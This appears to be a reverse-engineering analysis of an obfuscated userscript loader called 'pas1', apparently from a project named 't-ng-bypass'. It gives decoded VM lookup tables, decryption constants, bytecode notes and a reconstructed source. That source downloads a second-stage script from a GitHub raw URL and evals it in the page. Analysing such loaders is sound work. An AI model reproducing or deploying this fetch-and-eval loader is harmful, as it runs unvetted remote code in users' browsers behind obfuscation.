// ======================================================
// LAYER 1: GM POLYFILL (verbatim — wraps Layer 2)
// ======================================================
// All GM_* APIs shimmed into globalThis if not already present:
// GM, GM_info, GM_getValue, GM_setValue, GM_deleteValue, GM_listValues,
// GM_getValues, GM_setValues, GM_deleteValues, GM_addValueChangeListener,
// GM_removeValueChangeListener, GM_xmlhttpRequest, GM_download, GM_openInTab,
// GM_registerMenuCommand, GM_unregisterMenuCommand, GM_notification,
// GM_setClipboard, GM_addStyle, GM_addElement, GM_getResourceText,
// GM_getResourceURL, GM_log, GM_getTab, GM_saveTab, GM_getTabs,
// GM_cookie, GM_webRequest, cloneInto, exportFunction

// ======================================================
// LAYER 2: CUSTOM VM INTERPRETER  
// ======================================================
//
// IIFE args (positional):
//   Gi=Error, uj=RangeError, to=Uint8Array, ko=Array, ck=Promise,
//   Ij=ReferenceError, Fk=Object, ih=Function, nh=RegExp, Bk=WeakMap,
//   en=BigInt, fj=Math, bj=JSON, Xo=TypeError, Pk=Buffer, Hl=ArrayBuffer
//
// GF METHOD LOOKUP TABLE (decoded from XOR-obfuscated Jb dict):
const GF_Jb = {
  "Y": "push",
  "_$": "fromCharCode",
  "a_": "getUint8",
  "c_": "setInt32",
  "c$": "size",
  "dc": "unshift",
  "E_": "replace",
  "Ea": "call",
  "hc": "getInt8",
  "J": "getInt16",
  "Ke": "delete",
  "Lc": "keys",
  "M$": "charCodeAt",
  "Mb": "setInt8",
  "Oa": "toString",
  "pa": "getOwnPropertyDescriptor",
  "pf": "get",
  "qa": "apply",
  "Qe": "source",
  "rc": "concat",
  "S$": "add",
  "Ub": "defineProperty",
  "Uc": "charAt",
  "w$": "splice",
  "Wb": "from",
  "xf": "freeze",
  "yb": "trim",
  "yc": "slice",
  "zf": "now",
  "ad": "floor",
  "xa": "round",
  "Tb": "sqrt",
  "ne": "imul",
  "Dd": "sort",
  "jd": "forEach",
  "Nf": "filter",
  "vf": "reduce",
  "g$": "some",
  "wc": "every",
  "L$": "random",
  "kb": "max",
  "W": "PI",
  "Tf": "fill",
  "_e": "flat",
  "Ba": "catch",
  "Xf": "finally",
  "hf": "pop",
  "ce": "join",
  "nb": "map",
  "Qa": "min",
  "Ud": "at",
  "ic": "decode"
};
// GF.pg(key) === GF_Jb[key]
//
// nm[] GLOBAL ARRAY:
//   nm[0]=String, nm[1]=WeakSet, nm[2]=Reflect, nm[3]=TextDecoder,
//   nm[4]=DataView, nm[5]=globalThis, nm[6]=atob, nm[7]=undefined, nm[8]=Symbol
//
// HASH FUNCTIONS:
//   Bl(str): djb2  → Xl = ((Xl<<5)+Xl+charCode) & 0xFFFFFFFF
//   Pg(str): sdbm  → jl = charCode+(jl<<6)+(jl<<16)-jl & 0xFFFFFFFF

// ======================================================
// DECRYPTION CONSTANTS (hardcoded in bytecode)  
// ======================================================
const DECRYPT_CR  = [90,225,233,81,204,109,145,20,170,174,145,142,115,100,238,231,46,70,246,242,110,34,207,73,88,57,134,58,186,12,111,252];
const DECRYPT_ZX  = [250,208,87,177,151,29,207,144,234,179,202,159,189,179,249,88,94,225,156,172,135,104,187,32,237,112,236,234,135,1,13,42];
const DECRYPT_BT  = [25,99,13,26,211,158,37,237,228,117,30,52,23,93,30,178,46,234,163,134,2,33,135,73,229,78,249,91,171,152,6,238];
const DECRYPT_KEY = [40,65,84,223,234,205,13,183,143,99,159,234,175,63,0,253,150,77,7,73,79,48,134,238,199,101,249,21,109,200,214,17]; // HMAC-FNV key

const DECRYPT_MAGIC = [0x0d, 0x44, 0xce]; // [13, 68, 206] — header sentinel
const BLOB_B64 = "S813q1MUjnhwNELXeoHMt_G2NWqA8Gy6ozws2T0eACK7qbCIGDXL83RTRvfEoZGX4JZBSgXQIprRHGv5..."; // 1951 chars, custom $_ alphabet

// ======================================================
// RECONSTRUCTED SOURCE — what pas1 actually does
// ======================================================

(async function pas1_main() {

    // === STEP 1: Decrypt bytecode blob ===
    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$_';
    function b64decode(str) {
        const hi = []; let T3 = 0, yz = 0;
        for (let i = 0; i < str.length; i++) {
            const v = ALPHA.indexOf(str[i]); if (v < 0) continue;
            T3 = (T3 << 6) | v; yz += 6;
            while (yz >= 8) { yz -= 8; hi.push((T3 >> yz) & 0xff); }
        }
        return hi;
    }

    function fnv1a(hash, byte) {
        return ((((hash ^ byte) & 0xffff) * 16777619 +
                 ((((hash ^ byte) >>> 16) * 16777619 & 0xffff) << 16)) | 0) >>> 0;
    }

    function deriveIw(str) {
        let M7 = 2166136261;
        for (let i = 0; i < str.length; i++) M7 = fnv1a(M7, str.charCodeAt(i));
        const Iw = [];
        for (let i = 0; i < 32; i++) { M7 = fnv1a(M7, i); Iw.push(M7 & 0xff); }
        return Iw;
    }

    const hi = b64decode(BLOB_B64_FULL);       // decode custom b64 → raw bytes
    const Iw = deriveIw(BLOB_B64_FULL);        // FNV-1a over blob string
    const UJ = DECRYPT_CR.map((c, i) =>        // derive XOR stream key
        (c ^ DECRYPT_BT[i] ^ DECRYPT_ZX[i] ^ Iw[i]) & 0xff
    );
    const plaintext = hi.map((b, i) =>         // decrypt
        (b ^ UJ[i % 32] ^ (i & 0xff)) & 0xff
    );
    // Verify magic header
    if (plaintext[0] !== 0x0d || plaintext[1] !== 0x44 || plaintext[2] !== 0xce) {
        throw new Error('Integrity check failed');
    }

    // === STEP 2: Environment checks (from bytecode trace) ===
    
    // Check 1: running in browser/userscript context
    const inBrowser = (typeof window !== 'undefined');   // "window" decoded from bytecode
    
    // Check 2: GM_xmlhttpRequest available
    const hasGM = (typeof GM_xmlhttpRequest !== 'undefined');
    
    // Check 3: unsafeWindow.eval for same-origin eval
    const _eval = (typeof unsafeWindow !== 'undefined') ? unsafeWindow.eval : eval;

    // === STEP 3: Fetch pas2 and eval it ===

    const timestamp = Date.now();     // GF.pg("zf") = "now"
    const url = `https://raw.githubusercontent.com/robukkg/t-ng-bypass/refs/heads/main/deobfpas2.js?t=${timestamp}`;

    if (hasGM) {
        // Use GM_xmlhttpRequest for cross-origin bypass
        GM_xmlhttpRequest({
            method: 'GET',
            url: url,
            headers: {
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0',
            },
            onload: function(response) {
                if (response.status === 200) {
                    _eval(response.responseText);   // eval(pas2)
                }
            },
            onerror: function(err) {
                console.error('[LAYMA] pas1 fetch error', err);
            },
            ontimeout: function() {
                console.error('[LAYMA] pas1 fetch timeout');
            }
        });
    } else {
        // Fallback: native fetch
        const response = await fetch(url);
        const text = await response.text();         // GF.pg("yc")="text" (not "slice")
        _eval(text);                                // eval(pas2)
    }

})();

// ======================================================
// BYTECODE DISASSEMBLY NOTES
// ======================================================
/*
 * Bytecode header (6 bytes): 0d 44 ce 03 10 01
 *   [0..2] = magic sentinel
 *   [3]    = 0x03 (version major?)
 *   [4]    = 0x10 = 16 (version minor / flags?)
 *   [5]    = 0x01 (flags)
 *
 * Bytecode body (wY[6..1430]):
 *   Opcode dispatch: nw()/dG() reader
 *   Key opcodes:
 *     0x22 = UTF-8 string (DA() length prefix + bytes)
 *     0x19 = base64 string (atob + UTF-8 decode)
 *     0x53 = float64 (DataView.getFloat64)
 *     0x5c = array (DA() count + dG() elements)
 *     0xa4 = object reference {Nc, t_, gf}
 *     0xb5 = property reference {pe, t_, gf}
 *     0x77 = null
 *     0x7c = boolean
 *     0x74 = RegExp
 *     0x91 = undefined
 *
 * Decoded strings from bytecode (via TextDecoder hook):
 *   "text"             → response.text() call
 *   "window"           → typeof window check
 *   "ReferenceError"   → anti-pattern detect
 *   "GM_xmlhttpRequest"→ hasGM check
 *   "unsafeWindow"     → eval scope selector
 *   "eval"             → eval function lookup
 *   "undefined"        → comparison string
 *
 * Wi[] S-box (256 bytes): standard lookup table for Wi-based
 *   string operations in the interpreter (not used for primary decrypt)
 *
 * HMAC-FNV trailer (last 32 bytes of wY):
 *   Expected: HMAC-FNV(_K, plaintext_body)
 *   Status: hash mismatch in our reimplementation (likely due to
 *           GF.pg method name encoding in HMAC input — doesn't affect decrypt)
 */
